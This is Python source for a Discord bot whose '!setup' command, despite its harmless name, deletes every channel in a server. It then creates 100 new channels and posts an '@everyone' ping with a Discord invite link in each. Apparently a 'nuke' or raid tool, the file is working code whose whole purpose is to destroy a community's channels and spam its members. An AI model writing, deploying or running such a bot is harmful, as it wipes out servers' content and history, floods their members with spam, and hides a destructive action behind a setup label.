import discord
from discord.ext import commands
import os
import asyncio

# Setup intents
intents = discord.Intents.default()
intents.guilds = True
intents.guild_messages = True
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

SERVER_LINK = "https://discord.gg/csR7q83NmG"

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name} (ID: {bot.user.id})')
    print('------')

@bot.command()
@commands.has_permissions(administrator=True)
async def setup(ctx):
    guild = ctx.guild
    
    # Delete all channels
    print(f"Deleting all channels in {guild.name}...")
    delete_tasks = [channel.delete() for channel in guild.channels]
    await asyncio.gather(*delete_tasks)
    
    # Create 100 channels and send link
    print("Creating 100 new channels...")
    for i in range(1, 101):
        channel_name = f"setup-{i}"
        new_channel = await guild.create_text_channel(channel_name)
        await new_channel.send(f"@everyone {SERVER_LINK}")
        # Small delay to avoid hitting rate limits too hard
        await asyncio.sleep(0.1)

    print("Setup complete.")

# Run the bot
token = os.environ.get('DISCORD_TOKEN')
if token:
    bot.run(token)
else:
    print("Error: DISCORD_TOKEN not found in environment variables.")
